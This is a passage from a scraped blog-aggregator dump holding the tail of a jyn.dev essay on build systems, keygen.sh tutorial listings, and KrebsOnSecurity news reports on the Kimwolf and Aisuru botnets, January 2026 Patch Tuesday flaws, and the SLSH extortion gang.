React.</p>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/#so-what-counts-as-a-build-system","title":"so, what counts as a build system?","text":"<p>A build system is pretty much anything that lets you specify dependencies on a previous artifact \ud83d\ude04 Some more weird examples of build systems:</p> <ul> <li>Github Actions (jobs and workflows)</li> <li>Static site generators</li> <li>Docker-compose files</li> <li>Systemd unit files</li> <li>Excel</li> </ul> <p>Hopefully this post has given you both a vocabulary to talk about build systems and a context to compare them!</p>"},{"location":"jyn.dev/what%20is%20a%20build%20system%2C%20anyway-_20260205/#bibliography","title":"bibliography","text":"<ul> <li>Andrew Nesbitt, \u201cWhat is a Package Manager?\u201d</li> <li>jyn, \u201cbuild system tradeoffs\u201d</li> <li>Jade Lovelace, \u201cThe postmodern build system\u201d</li> <li>Casey Rodarmor, \u201cJust Programmer's Manual\u201d</li> <li>Fabien Sanglard, \u201cDriving Compilers\u201d</li> <li>The Rust Project Contributors, \u201cIncremental compilation in detail\u201d</li> <li>The Rust Project Contributors, \u201cQueries: demand-driven compilation\u201d</li> <li>\u201cfunctools \u2014 Higher-order functions and operations on callable objects \u2014 Python 3.14.2 documentation\u201d</li> <li>Hillel Wayne, \u201cThe Capability-Tractability Tradeoff\u201d</li> <li>Neil Mitchell, \u201cShake Build System\u201d</li> <li>\u201cThe Ninja build system\u201d</li> <li>Peter Miller, \u201cRecursive Make Considered Harmful\u201d</li> <li>Rebecca Mark and Paul Chiusano, \u201cIncremental evaluation via memoization \u00b7 Unison programming language\u201d</li> <li>\u201cHermeticity | Bazel\u201d</li> <li>\u201cPersistent Workers | Bazel\u201d</li> <li>\u201cLabels | Bazel\u201d</li> <li>\u201cCommandments of reproducible builds\u201d</li> <li>Mokhov et. al., Build Systems \u00e0 la Carte</li> <li>\u201cPhony Targets (GNU make)\u201d</li> <li>Facebook, \u201cSapling: A Scalable, User-Friendly Source Control System.\u201d</li> <li>Erdweg et. al., \"A Sound and Optimal Incremental Build System with Dynamic Dependencies\"</li> <li>David Lattimore, \u201cDesigning Wild's incremental linking\u201d</li> <li>Bo Lord, \u201cHow to Recalculate a Spreadsheet\u201d</li> <li>\u201cninja\u2014<code>depfile_parser</code>\u201d</li> <li>\u201csalsa - A generic framework for on-demand, incrementalized computation\u201d</li> <li>\u201cDefining the database struct - Salsa\u201d</li> <li>Felix Klock and Mark Rousskov on behalf of the Rust compiler team, \u201cAnnouncing Rust 1.52.1\u201d</li> <li>Yaron Minsky, \u201cJane Street Blog - Breaking down FRP \u201d</li> <li>\u201cAdding Interactivity \u2013 React\u201d</li> <li> <p>\u201cState: A Component's Memory \u2013 React\u201d</p> </li> <li> <p>Nearly all build systems are inconsistent about whether a rule refers to an abstract description of how to build an output (i.e., can be reused for multiple sets of inputs and outputs), or a concrete instantiation of that description for a specific set of inputs and outputs. We have to live with the ambiguity, unfortunately. \u21a9</p> </li> <li> <p>Weird things can happen here though; for example early cutoff can allow circular dependencies. This sometimes comes up for generated build.ninja files. \u21a9</p> </li> <li> <p>The pluto paper defines this as \u201cafter a build, generated files consistently reflect the latest source files\u201d. Neither my definition nor pluto's definition are particularly well-defined if the build is non-deterministic. Defining this formally would probably require constructing an isomorphism between all programs with the same runtime behavior; but \u201cruntime behavior\u201d is not well-defined for a general-purpose build system that can output artifacts that are not programs. \u21a9</p> </li> <li> <p>As we'll see later, the reverse is also true: a common design for build systems is to automatically inject cache points into an existing task runner, or to design the rule file to look as similar to a shell script or function call as possible. \u21a9</p> </li> <li> <p>In particular, nearly all modern inter-process build systems have a limited form of tracing where they ask the compiler to generate \"dep-info\" files 16 that show which files were used (usually through imports) by a given source file. Note that this dep-info is not available until after the first time a build has run, and that this only works if the compiler supports it. \u21a9</p> </li> <li> <p>For more information about the spectrum of designs between applicative and monadic, see the post-modern build system. \u21a9</p> </li> <li> <p>Note that the dev-guide assumes that tasks are expensive relative to the cost of constructing the graph. This is true in the context of rustc, where LLVM codegen 17 normally dominates compilation time, but it isn't true for e.g. spreadsheets. \u21a9</p> </li> <li> <p>It's possible for tasks to create files that aren't tracked by the build system, but these aren't called artifacts. I don't know a good word for these; \"byproducts\" is the closest but some build systems use that to mean any intermediate artifacts. \u21a9</p> </li> <li> <p>I'm not super happy with this definition because it conflicts with how compilers use the term, but I do think it describes how most build systems think about files. \u21a9</p> </li> <li> <p>Poorly written rules can also depend on which other rules are executing at the same time, which is called a race condition. Note this does not require the rule to be unsound, only for it to use intermediate files the build system doesn\u2019t know about. \u21a9</p> </li> <li> <p>for C, header files; for other languages, usually source files or intermediate representations. \u21a9</p> </li> <li> <p>Yes, this overlaps with the term for sandboxing. Try to avoid the word \"isolated\" if possible. \u21a9</p> </li> <li> <p>This has no relation to a target platfom , which is related to cross-compiling. I wish we had better names for these things. \u21a9</p> </li> <li> <p>I would actually describe this as much harder than tracing an inter-process build system, since there aren't very good systems for tracking memory access. See this post about unstable fingerprints for an idea of what bugs this causes in practice. \u21a9</p> </li> <li> <p>This actually has very strong analogies to the way \"query\" is used in a database context: just like a tracing query system, a database has to be able to restart a query's transaction if the data it's trying to access has been modified. \u21a9</p> </li> <li> <p>What is a dep-info file? Good question! It's a makefile. It's literally a makefile. Don't you just love proving backslashes by induction? \u21a9</p> </li> <li> <p>Or, more rarely, type-checking, borrow-checking, or coherence checking. \u21a9</p> </li> </ul>"},{"location":"keygen.sh/","title":"keygen.sh\\n\\n\u7f51\u7ad9: https://keygen.sh\\nRSS: https://keygen.sh/blog/feed.xml\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- How I replaced Baremetrics and ChartMogul with Rake_20260205\\n- How to Implement API Key Authentication in Rails Without Devise_20260205\\n- How to Generate Secure License Keys in 2026_20260205\\n- How to Build a Webhook System in Rails Using Sidekiq_20260205\\n- How to License and Distribute a Private Node Module_20260205\\n","text":""},{"location":"keygen.sh/How%20I%20replaced%20Baremetrics%20and%20ChartMogul%20with%20Rake_20260205/","title":"How I replaced Baremetrics and ChartMogul with Rake\\n\\n\u6765\u6e90: https://keygen.sh\\n\u94fe\u63a5: https://keygen.sh/blog/how-i-replaced-baremetrics-and-chartmogul-with-rake/\\n\u65e5\u671f: Tue, 05 Jan 2021 06:00:00 GMT\\n\\n---\\n\\nHow I used a Rake task to replace Baremetrics and ChartMogul for business analytics.","text":""},{"location":"keygen.sh/How%20to%20Build%20a%20Webhook%20System%20in%20Rails%20Using%20Sidekiq_20260205/","title":"How to Build a Webhook System in Rails Using Sidekiq\\n\\n\u6765\u6e90: https://keygen.sh\\n\u94fe\u63a5: https://keygen.sh/blog/how-to-build-a-webhook-system-in-rails-using-sidekiq/\\n\u65e5\u671f: Wed, 16 Jun 2021 05:00:00 GMT\\n\\n---\\n\\nIt's the heyday of SaaS and webhooks are all the rage. Learn how to build a webhook system for your service using Rails and Sidekiq.","text":""},{"location":"keygen.sh/How%20to%20Generate%20Secure%20License%20Keys%20in%202026_20260205/","title":"How to Generate Secure License Keys in 2026\\n\\n\u6765\u6e90: https://keygen.sh\\n\u94fe\u63a5: https://keygen.sh/blog/how-to-generate-license-keys/\\n\u65e5\u671f: Wed, 02 Jun 2021 05:00:00 GMT\\n\\n---\\n\\nSoftware vendors should move away from legacy license key algorithms such as partial key verification to generating secure license keys using modern algorithms like elliptic-curve and RSA cryptography.","text":""},{"location":"keygen.sh/How%20to%20Implement%20API%20Key%20Authentication%20in%20Rails%20Without%20Devise_20260205/","title":"How to Implement API Key Authentication in Rails Without Devise\\n\\n\u6765\u6e90: https://keygen.sh\\n\u94fe\u63a5: https://keygen.sh/blog/how-to-implement-api-key-authentication-in-rails-without-devise/\\n\u65e5\u671f: Fri, 16 Apr 2021 05:00:00 GMT\\n\\n---\\n\\nContrary to popular belief, you don't need Devise to implement API key authentication in a Ruby on Rails app.","text":""},{"location":"keygen.sh/How%20to%20License%20and%20Distribute%20a%20Private%20Node%20Module_20260205/","title":"How to License and Distribute a Private Node Module\\n\\n\u6765\u6e90: https://keygen.sh\\n\u94fe\u63a5: https://keygen.sh/blog/how-to-license-and-distribute-commercial-node-modules/\\n\u65e5\u671f: Wed, 04 Aug 2021 05:00:00 GMT\\n\\n---\\n\\nLearn how to license and distribute private Node.js packages using Keygen's software licensing and distribution API.","text":""},{"location":"krebsonsecurity.com/","title":"krebsonsecurity.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Kimwolf Botnet Lurking in Corporate, Govt. Networks_20260120</li> <li>Patch Tuesday, January 2026 Edition_20260114</li> <li>Please Don\u2019t Feed the Scattered Lapsus ShinyHunters_20260202</li> <li>Who Benefited from the Aisuru and Kimwolf Botnets-_20260108</li> <li>Who Operates the Badbox 2.0 Botnet-_20260126</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"krebsonsecurity.com/Kimwolf%20Botnet%20Lurking%20in%20Corporate%2C%20Govt.%20Networks_20260120/","title":"Kimwolf Botnet Lurking in Corporate, Govt. Networks","text":"<p>\u6765\u6e90: krebsonsecurity.com \u53d1\u5e03\u65f6\u95f4: Tue, 20 Jan 2026 18:19:13 +0000 \u94fe\u63a5: https://krebsonsecurity.com/2026/01/kimwolf-botnet-lurking-in-corporate-govt-networks/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' A new Internet-of-Things (IoT) botnet called Kimwolf has spread to more than 2 million devices, forcing infected systems to participate in massive distributed denial-of-service (DDoS) attacks and to relay other malicious and abusive Internet traffic. Kimwolf\u2019s ability to scan the local networks of compromised systems for other IoT devices to infect makes it a sobering threat to organizations, and new research reveals Kimwolf is surprisingly prevalent in government and corporate networks. \\n Image: Shutterstock, @Elzicon. \\n Kimwolf grew rapidly in the waning months of 2025 by tricking various \u201cresidential proxy\u201d services into relaying malicious commands to devices on the local networks of those proxy endpoints. Residential proxies are sold as a way to anonymize and localize one\u2019s Web traffic to a specific region, and the biggest of these services allow customers to route their Internet activity through devices in virtually any country or city around the globe. \\n The malware that turns one\u2019s Internet connection into a proxy node is often quietly bundled with various mobile apps and games, and it typically forces the infected device to relay malicious and abusive traffic \u2014 including ad fraud, account takeover attempts, and mass content-scraping. \\n Kimwolf mainly targeted proxies from IPIDEA , a Chinese service that has millions of proxy endpoints for rent on any given week. The Kimwolf operators discovered they could forward malicious commands to the internal networks of IPIDEA proxy endpoints, and then programmatically scan for and infect other vulnerable devices on each endpoint\u2019s local network. \\n Most of the systems compromised through Kimwolf\u2019s local network scanning have been unofficial Android TV streaming boxes. These are typically Android Open Source Project devices \u2014 not Android TV OS devices or Play Protect certified Android devices \u2014 and they are generally marketed as a way to watch unlimited (read:pirated) video content from popular subscription streaming services for a one-time fee. \\n However, a great many of these TV boxes ship to consumers with residential proxy software pre-installed. What\u2019s more, they have no real security or authentication built-in: If you can communicate directly with the TV box, you can also easily compromise it with malware. \\n While IPIDEA and other affected proxy providers recently have taken steps to block threats like Kimwolf from going upstream into their endpoints (reportedly with varying degrees of success), the Kimwolf malware remains on millions of infected devices. \\n A screenshot of IPIDEA\u2019s proxy service. \\n Kimwolf\u2019s close association with residential proxy networks and compromised Android TV boxes might suggest we\u2019d find relatively few infections on corporate networks. However, the security firm Infoblox said a recent review of its customer traffic found nearly 25 percent of them made a query to a Kimwolf-related domain name since October 1, 2025 , when the botnet first showed signs of life. \\n Infoblox found the affected customers are based all over the world and in a wide range of industry verticals, from education and healthcare to government and finance. \\n \u201cTo be clear, this suggests that nearly 25% of customers had at least one device that was an endpoint in a residential proxy service targeted by Kimwolf operators,\u201d Infoblox explained . \u201cSuch a device, maybe a phone or a laptop, was essentially co-opted by the threat actor to probe the local network for vulnerable devices. A query means a scan was made, not that new devices were compromised. Lateral movement would fail if there were no vulnerable devices to be found or if the DNS resolution was blocked.\u201d \\n Synthient , a startup that tracks proxy services and was the first to disclose on January 2 the unique methods Kimwolf uses to spread, found proxy endpoints from IPIDEA were present in alarming numbers at government and academic institutions worldwide. Synthient said it spied at least 33,000 affected Internet addresses at universities and colleges, and nearly 8,000 IPIDEA proxies within various U.S. and foreign government networks. \\n The top 50 domain names sought out by users of IPIDEA\u2019s residential proxy service, according to Synthient. \\n In a webinar on January 16, experts at the proxy tracking service Spur profiled Internet addresses associated with IPIDEA and 10 other proxy services that were thought to be vulnerable to Kimwolf\u2019s tricks. Spur found residential proxies in nearly 300 government owned and operated networks, 318 utility companies, 166 healthcare companies or hospitals, and 141 companies in banking and finance. \\n \u201cI looked at the 298 [government] owned and operated [networks], and so many of them were DoD [U.S. Department of Defense], which is kind of terrifying that DoD has IPIDEA and these other proxy services located inside of it,\u201d Spur Co-Founder Riley Kilmer said. \u201cI don\u2019t know how these enterprises have these networks set up. It could be that [infected devices] are segregated on the network, that even if you had local access it doesn\u2019t really mean much. However, it\u2019s something to be aware of. If a device goes in, anything that device has access to the proxy would have access to.\u201d \\n Kilmer said Kimwolf demonstrates how a single residential proxy infection can quickly lead to bigger problems for organizations that are harboring unsecured devices behind their firewalls, noting that proxy services present a potentially simple way for attackers to probe other devices on the local network of a targeted organization. \\n \u201cIf you know you have [proxy] infections that are located in a company, you can chose that [network] to come out of and then locally pivot,\u201d Kilmer said. \u201cIf you have an idea of where to start or look, now you have a foothold in a company or an enterprise based on just that.\u201d \\n This is the third story in our series on the Kimwolf botnet. Next week, we\u2019ll shed light on the myriad China-based individuals and companies connected to the Badbox 2.0 botnet , the collective name given to a vast number of Android TV streaming box models that ship with no discernible security or authentication built-in, and with residential proxy malware pre-installed. \\n Further reading: \\n The Kimwolf Botnet is Stalking Your Local Network \\n Who Benefitted from the Aisuru and Kimwolf Botnets? \\n A Broken System Fueling Botnets (Synthient). '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:57:03</p>"},{"location":"krebsonsecurity.com/Patch%20Tuesday%2C%20January%202026%20Edition_20260114/","title":"Patch Tuesday, January 2026 Edition","text":"<p>\u6765\u6e90: krebsonsecurity.com \u53d1\u5e03\u65f6\u95f4: Wed, 14 Jan 2026 00:47:38 +0000 \u94fe\u63a5: https://krebsonsecurity.com/2026/01/patch-tuesday-january-2026-edition/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' Microsoft today issued patches to plug at least 113 security holes in its various Windows operating systems and supported software. Eight of the vulnerabilities earned Microsoft\u2019s most-dire \u201ccritical\u201d rating, and the company warns that attackers are already exploiting one of the bugs fixed today. \\n \\n January\u2019s Microsoft zero-day flaw \u2014 CVE-2026-20805 \u2014 is brought to us by a flaw in the Desktop Window Manager (DWM), a key component of Windows that organizes windows on a user\u2019s screen. Kev Breen , senior director of cyber threat research at Immersive , said despite awarding CVE-2026-20805 a middling CVSS score of 5.5, Microsoft has confirmed its active exploitation in the wild, indicating that threat actors are already leveraging this flaw against organizations. \\n Breen said vulnerabilities of this kind are commonly used to undermine Address Space Layout Randomization (ASLR), a core operating system security control designed to protect against buffer overflows and other memory-manipulation exploits. \\n \u201cBy revealing where code resides in memory, this vulnerability can be chained with a separate code execution flaw, transforming a complex and unreliable exploit into a practical and repeatable attack,\u201d Breen said. \u201cMicrosoft has not disclosed which additional components may be involved in such an exploit chain, significantly limiting defenders\u2019 ability to proactively threat hunt for related activity. As a result, rapid patching currently remains the only effective mitigation.\u201d \\n Chris Goettl , vice president of product management at Ivanti , observed that CVE-2026-20805 affects all currently supported and extended security update supported versions of the Windows OS. Goettl said it would be a mistake to dismiss the severity of this flaw based on its \u201cImportant\u201d rating and relatively low CVSS score. \\n \u201cA risk-based prioritization methodology warrants treating this vulnerability as a higher severity than the vendor rating or CVSS score assigned,\u201d he said. \\n Among the critical flaws patched this month are two Microsoft Office remote code execution bugs ( CVE-2026-20952 and CVE-2026-20953 ) that can be triggered just by viewing a booby-trapped message in the Preview Pane. \\n Our October 2025 Patch Tuesday \u201cEnd of 10\u201d roundup noted that Microsoft had removed a modem driver from all versions after it was discovered that hackers were abusing a vulnerability in it to hack into systems. Adam Barnett at Rapid7 said Microsoft today removed another couple of modem drivers from Windows for a broadly similar reason: Microsoft is aware of functional exploit code for an elevation of privilege vulnerability in a very similar modem driver, tracked as CVE-2023-31096 . \\n \u201cThat\u2019s not a typo; this vulnerability was originally published via MITRE over two years ago, along with a credible public writeup by the original researcher,\u201d Barnett said. \u201cToday\u2019s Windows patches remove agrsm64.sys and agrsm.sys. All three modem drivers were originally developed by the same now-defunct third party, and have been included in Windows for decades. These driver removals will pass unnoticed for most people, but you might find active modems still in a few contexts, including some industrial control systems.\u201d \\n According to Barnett, two questions remain: How many more legacy modem drivers are still present on a fully-patched Windows asset; and how many more elevation-to-SYSTEM vulnerabilities will emerge from them before Microsoft cuts off attackers who have been enjoying \u201cliving off the land[line] by exploiting an entire class of dusty old device drivers?\u201d \\n \u201cAlthough Microsoft doesn\u2019t claim evidence of exploitation for CVE-2023-31096, the relevant 2023 write-up and the 2025 removal of the other Agere modem driver have provided two strong signals for anyone looking for Windows exploits in the meantime,\u201d Barnett said. \u201cIn case you were wondering, there is no need to have a modem connected; the mere presence of the driver is enough to render an asset vulnerable.\u201d \\n Immersive, Ivanti and Rapid7 all called attention to CVE-2026-21265 , which is a critical Security Feature Bypass vulnerability affecting Windows Secure Boot. This security feature is designed to protect against threats like rootkits and bootkits, and it relies on a set of certificates that are set to expire in June 2026 and October 2026. Once these 2011 certificates expire, Windows devices that do not have the new 2023 certificates can no longer receive Secure Boot security fixes. \\n Barnett cautioned that when updating the bootloader and BIOS, it is essential to prepare fully ahead of time for the specific OS and BIOS combination you\u2019re working with, since incorrect remediation steps can lead to an unbootable system. \\n \u201cFifteen years is a very long time indeed in information security, but the clock is running out on the Microsoft root certificates which have been signing essentially everything in the Secure Boot ecosystem since the days of Stuxnet,\u201d Barnett said. \u201cMicrosoft issued replacement certificates back in 2023, alongside CVE-2023-24932 which covered relevant Windows patches as well as subsequent steps to remediate the Secure Boot bypass exploited by the BlackLotus bootkit.\u201d \\n Goettl noted that Mozilla \\xa0has released updates for Firefox and Firefox ESR resolving a total of 34 vulnerabilities, two of which are suspected to be exploited (CVE-2026-0891 and CVE-2026-0892). Both are resolved in Firefox 147 (MFSA2026-01) and CVE-2026-0891 is resolved in Firefox ESR 140.7 (MFSA2026-03). \\n \u201cExpect Google Chrome and Microsoft Edge updates this week in addition to a high severity vulnerability in Chrome WebView that was resolved in the January 6 Chrome update (CVE-2026-0628),\u201d Goettl said. \\n As ever, the SANS Internet Storm Center has a per-patch breakdown by severity and urgency. Windows admins should keep an eye on askwoody.com for any news about patches that don\u2019t quite play nice with everything. If you experience any issues related installing January\u2019s patches, please drop a line in the comments below. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:57:04</p>"},{"location":"krebsonsecurity.com/Please%20Don%E2%80%99t%20Feed%20the%20Scattered%20Lapsus%20ShinyHunters_20260202/","title":"Please Don\u2019t Feed the Scattered Lapsus ShinyHunters","text":"<p>\u6765\u6e90: krebsonsecurity.com \u53d1\u5e03\u65f6\u95f4: Mon, 02 Feb 2026 16:15:16 +0000 \u94fe\u63a5: https://krebsonsecurity.com/2026/02/please-dont-feed-the-scattered-lapsus-shiny-hunters/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' A prolific data ransom gang that calls itself Scattered Lapsus ShinyHunters (SLSH) has a distinctive playbook when it seeks to extort payment from victim firms: Harassing, threatening and even swatting executives and their families, all while notifying journalists and regulators about the extent of the intrusion. Some victims reportedly are paying \u2014 perhaps as much to contain the stolen data as to stop the escalating personal attacks. But a top SLSH expert warns that engaging at all beyond a \u201cWe\u2019re not paying\u201d response only encourages further harassment, noting that the group\u2019s fractious and unreliable history means the only winning move is not to pay. \\n Image: Shutterstock.com, @Mungujakisa \\n Unlike traditional, highly regimented Russia-based ransomware affiliate groups, SLSH is an unruly and somewhat fluid English-language extortion gang that appears uninterested in building a reputation of consistent behavior whereby victims might have some measure of confidence that the criminals will keep their word if paid. \\n That\u2019s according to Allison Nixon , director of research at the New York City based security consultancy Unit 221B . Nixon has been closely tracking the criminal group and individual members as they bounce between various Telegram channels used to extort and harass victims, and she said SLSH differs from traditional data ransom groups in other important ways that argue against trusting them to do anything they say they\u2019ll do \u2014 such as destroying stolen data. \\n Like SLSH, many traditional Russian ransomware groups have employed high-pressure tactics to force payment in exchange for a decryption key and/or a promise to delete stolen data, such as publishing a dark web shaming blog with samples of stolen data next to a countdown clock, or notifying journalists and board members of the victim company. But Nixon said the extortion from SLSH quickly escalates way beyond that \u2014 to threats of physical violence against executives and their families, DDoS attacks on the victim\u2019s website, and repeated email-flooding campaigns. \\n SLSH is known for breaking into companies by phishing employees over the phone, and using the purloined access to steal sensitive internal data. In a January 30 blog post , Google\u2019s security forensics firm Mandiant said SLSH\u2019s most recent extortion attacks stem from incidents spanning early to mid-January 2026, when SLSH members pretended to be IT staff and called employees at targeted victim organizations claiming that the company was updating MFA settings. \\n \u201cThe threat actor directed the employees to victim-branded credential harvesting sites to capture their SSO credentials and MFA codes, and then registered their own device for MFA,\u201d the blog post explained. \\n Victims often first learn of the breach when their brand name is uttered on whatever ephemeral new public Telegram group chat SLSH is using to threaten, extort and harass their prey. According to Nixon, the coordinated harassment on the SLSH Telegram channels is part of a well-orchestrated strategy to overwhelm the victim organization by manufacturing humiliation that pushes them over the threshold to pay. \\n Nixon said multiple executives at targeted organizations have been subject to \u201cswatting\u201d attacks, wherein SLSH communicated a phony bomb threat or hostage situation at the target\u2019s address in the hopes of eliciting a heavily armed police response at their home or place of work. \\n \u201cA big part of what they\u2019re doing to victims is the psychological aspect of it, like harassing executives\u2019 kids and threatening the board of the company,\u201d Nixon told KrebsOnSecurity. \u201cAnd while these victims are getting extortion demands, they\u2019re simultaneously getting outreach from media outlets saying, \u2018Hey, do you have any comments on the bad things we\u2019re going to write about you.\u201d \\n In a blog post today , Unit 221B argues that no one should negotiate with SLSH because the group has demonstrated a willingness to extort victims based on promises that it has no intention to keep. Nixon points out that all of SLSH\u2019s known members hail from The Com , shorthand for a constellation of cybercrime-focused Discord and Telegram communities which serve as a kind of distributed social network that facilitates instant collaboration . \\n Nixon said Com-based extortion groups tend to instigate feuds and drama between group members, leading to lying, betrayals, credibility destroying behavior, backstabbing, and sabotaging each other. \\n \u201cWith this type of ongoing dysfunction, often compounding by substance abuse, these threat actors often aren\u2019t able to act with the core goal in mind of completing a successful, strategic ransom operation,\u201d Nixon wrote. \u201cThey continually lose control with outbursts that put their strategy and operational security at risk, which severely limits their ability to build a professional, scalable, and sophisticated criminal organization network for continued successful ransoms \u2013 unlike other, more tenured and professional criminal organizations focused on ransomware alone.\u201d \\n Intrusions from established ransomware groups typically center around encryption/decryption malware that mostly stays on the affected machine. In contrast, Nixon said, ransom from a Com group is often structured the same as violent sextortion schemes against minors, wherein members of The Com will steal damaging information, threaten to release it, and \u201cpromise\u201d to delete it if the victim complies without any guarantee or technical proof point that they will keep their word. She writes: \\n A key component of SLSH\u2019s efforts to convince victims to pay, Nixon said, involves manipulating the media into hyping the threat posed by this group. This approach also borrows a page from the playbook of sextortion attacks, she said, which encourages predators to keep targets continuously engaged and worrying about the consequences of non-compliance. \\n \u201cOn days where SLSH had no substantial criminal \u2018win\u2019 to announce, they focused on announcing death threats and harassment to keep law enforcement, journalists, and cybercrime industry professionals focused on this group,\u201d she said. \\n An excerpt from a sextortion tutorial from a Com-based Telegram channel. Image: Unit 221B. \\n Nixon knows a thing or two about being threatened by SLSH: For the past several months, the group\u2019s Telegram channels have been replete with threats of physical violence against her, against Yours Truly, and against other security researchers. These threats, she said, are just another way the group seeks to generate media attention and achieve a veneer of credibility, but they are useful as indicators of compromise because SLSH members tend to name drop and malign security researchers even in their communications with victims. \\n \u201cWatch for the following behaviors in their communications to you or their public statements,\u201d Unit 221B\u2019s advisory reads. \u201cRepeated abusive mentions of Allison Nixon (or \u201cA.N\u201d), Unit 221B, or cybersecurity journalists\u2014especially Brian Krebs\u2014or any other cybersecurity employee, or cybersecurity company. Any threats to kill, or commit terrorism, or violence against internal employees, cybersecurity employees, investigators, and journalists.\u201d \\n Unit 221B says that while the pressure campaign during an extortion attempt may be traumatizing to employees, executives, and their family members, entering into drawn-out negotiations with SLSH incentivizes the group to increase the level of harm and risk, which could include the physical safety of employees and their families. \\n \u201cThe breached data will never go back to the way it was, but we can assure you that the harassment will end,\u201d Nixon said. \u201cSo, your decision to pay should be a separate issue from the harassment. We believe that when you separate these issues, you will objectively see that the best course of action to protect your interests, in both the short and long term, is to refuse payment.\u201d '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:56:59</p>"},{"location":"krebsonsecurity.com/Who%20Benefited%20from%20the%20Aisuru%20and%20Kimwolf%20Botnets-_20260108/","title":"Who Benefited from the Aisuru and Kimwolf Botnets?","text":"<p>\u6765\u6e90: krebsonsecurity.com \u53d1\u5e03\u65f6\u95f4: Thu, 08 Jan 2026 23:23:43 +0000 \u94fe\u63a5: https://krebsonsecurity.com/2026/01/who-benefited-from-the-aisuru-and-kimwolf-botnets/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' Our first story of 2026 revealed how a destructive new botnet called Kimwolf has infected more than two million devices by mass-compromising a vast number of unofficial Android TV streaming boxes . Today, we\u2019ll dig through digital clues left behind by the hackers, network operators and services that appear to have benefitted from Kimwolf\u2019s spread. \\n On Dec. 17, 2025, the Chinese security firm XLab published a deep dive on Kimwolf , which forces infected devices to participate in distributed denial-of-service (DDoS) attacks and to relay abusive and malicious Internet traffic for so-called \u201cresidential proxy\u201d services. \\n The software that turns one\u2019s device into a residential proxy is often quietly bundled with mobile apps and games. Kimwolf specifically targeted residential proxy software that is factory installed on more than a thousand different models of unsanctioned Android TV streaming devices. Very quickly, the residential proxy\u2019s Internet address starts funneling traffic that is linked to ad fraud, account takeover attempts and mass content scraping. \\n The XLab report explained its researchers found \u201cdefinitive evidence\u201d that the same cybercriminal actors and infrastructure were used to deploy both Kimwolf and the Aisuru botnet \u2014 an earlier version of Kimwolf that also enslaved devices for use in DDoS attacks and proxy services. \\n XLab said it suspected since October that Kimwolf and Aisuru had the same author(s) and operators, based in part on shared code changes over time. But it said those suspicions were confirmed on December 8 when it witnessed both botnet strains being distributed by the same Internet address at 93.95.112[.]59 . \\n Image: XLab. \\n RESI RACK \\n Public records show the Internet address range flagged by XLab is assigned to Lehi, Utah-based Resi Rack LLC . Resi Rack\u2019s website bills the company as a \u201cPremium Game Server Hosting Provider.\u201d Meanwhile, Resi Rack\u2019s ads on the Internet moneymaking forum BlackHatWorld \\xa0refer to it as a \u201cPremium Residential Proxy Hosting and Proxy Software Solutions Company.\u201d \\n Resi Rack co-founder Cassidy Hales told KrebsOnSecurity his company received a notification on December 10 about Kimwolf using their network \u201cthat detailed what was being done by one of our customers leasing our servers.\u201d \\n \u201cWhen we received this email we took care of this issue immediately,\u201d Hales wrote in response to an email requesting comment. \u201cThis is something we are very disappointed is now associated with our name and this was not the intention of our company whatsoever.\u201d \\n The Resi Rack Internet address cited by XLab on December 8 came onto KrebsOnSecurity\u2019s radar more than two weeks before that. Benjamin Brundage is founder of Synthient , a startup that tracks proxy services. In late October 2025, Brundage shared that the people selling various proxy services which benefitted from the Aisuru and Kimwolf botnets were doing so at a new Discord server called resi[.]to . \\n On November 24, 2025, a member of the resi-dot-to Discord channel shares an IP address responsible for proxying traffic over Android TV streaming boxes infected by the Kimwolf botnet. \\n When KrebsOnSecurity joined the resi[.]to Discord channel in late October as a silent lurker, the server had fewer than 150 members, including \u201c Shox \u201d \u2014 the nickname used by Resi Rack\u2019s co-founder Mr. Hales \u2014 and his business partner \u201c Linus ,\u201d who did not respond to requests for comment. \\n Other members of the resi[.]to Discord channel would periodically post new IP addresses that were responsible for proxying traffic over the Kimwolf botnet. As the screenshot from resi[.]to above shows, that Resi Rack Internet address flagged by XLab was used by Kimwolf to direct proxy traffic as far back as November 24, if not earlier. All told, Synthient said it tracked at least seven static Resi Rack IP addresses connected to Kimwolf proxy infrastructure between October and December 2025. \\n Neither of Resi Rack\u2019s co-owners responded to follow-up questions. Both have been active in selling proxy services via Discord for nearly two years. According to a review of Discord messages indexed by the cyber intelligence firm Flashpoint , Shox and Linus spent much of 2024 selling static \u201cISP proxies\u201d by routing various Internet address blocks at major U.S. Internet service providers. \\n In February 2025, AT&amp;T announced that effective July 31, 2025, it would no longer originate routes for network blocks that are not owned and managed by AT&amp;T (other major ISPs have since made similar moves). Less than a month later, Shox and Linus told customers they would soon cease offering static ISP proxies as a result of these policy changes. \\n Shox and Linux, talking about their decision to stop selling ISP proxies. \\n DORT &amp; SNOW \\n The stated owner of the resi[.]to Discord server went by the abbreviated username \u201cD.\u201d That initial appears to be short for the hacker handle \u201c Dort ,\u201d a name that was invoked frequently throughout these Discord chats. \\n Dort\u2019s profile on resi dot to. \\n This \u201cDort\u201d nickname came up in KrebsOnSecurity\u2019s recent conversations with \u201c Forky ,\u201d a Brazilian man who acknowledged being involved in the marketing of the Aisuru botnet at its inception in late 2024. But Forky vehemently denied having anything to do with a series of massive and record-smashing DDoS attacks in the latter half of 2025 that were blamed on Aisuru, saying the botnet by that point had been taken over by rivals. \\n Forky asserts that Dort is a resident of Canada and one of at least two individuals currently in control of the Aisuru/Kimwolf botnet. The other individual Forky named as an Aisuru/Kimwolf botmaster goes by the nickname \u201c Snow .\u201d \\n On January 2 \u2014 just hours after our story on Kimwolf was published \u2014 the historical chat records on resi[.]to were erased without warning and replaced by a profanity-laced message for Synthient\u2019s founder. Minutes after that, the entire server disappeared. \\n Later that same day, several of the more active members of the now-defunct resi[.]to Discord server moved to a Telegram channel where they posted Brundage\u2019s personal information, and generally complained about being 